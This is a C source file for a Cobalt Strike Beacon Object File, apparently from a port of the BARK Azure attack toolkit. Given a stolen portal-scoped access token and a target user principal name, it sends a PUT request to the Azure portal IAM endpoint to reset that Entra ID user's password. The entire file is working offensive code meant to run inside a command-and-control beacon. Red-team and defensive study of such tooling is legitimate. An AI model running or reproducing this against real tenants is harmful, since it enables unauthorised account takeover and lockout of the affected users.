/*
 * reset_entra_user_password.c — BARK BOF
 * Reset-EntraUserPassword — Reset an Entra user password via the portal IAM API
 *
 * Args : token (portal-scoped), targetUpn
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[1024];
    LPWSTR hdrWide = NULL, widePath = NULL;
    char  *resp    = NULL;
    char  *token = NULL, *targetUpn = NULL;

    BeaconDataParse(&parser, args, alen);
    token     = BeaconDataExtract(&parser, NULL);
    targetUpn = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_reset_entra_user_password <token> <targetUpn>\n");
        return;
    }

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/api/PasswordReset/ResetPasswordByUpn?userPrincipalName=%s", targetUpn);

    hdrWide  = BarkMakeAuthHeader(token,
        "x-ms-client-request-id: barkkai-bof-00000001\r\n"
        "Content-Type: application/json\r\n");
    widePath = MbsToWcs(pathBuf);
    if (!hdrWide || !widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] String conversion failed\n");
        HFree(hdrWide); HFree(widePath); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reset-EntraUserPassword for %s\n", targetUpn);
    resp = HttpRequest(L"PUT", L"main.iam.ad.ext.azure.com", widePath, hdrWide, "{}", 2, NULL);
    if (resp) { BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp); HFree(resp); }
    else      { BeaconPrintf(CALLBACK_ERROR,  "[-] Request failed\n"); }
    HFree(hdrWide);
    HFree(widePath);
}
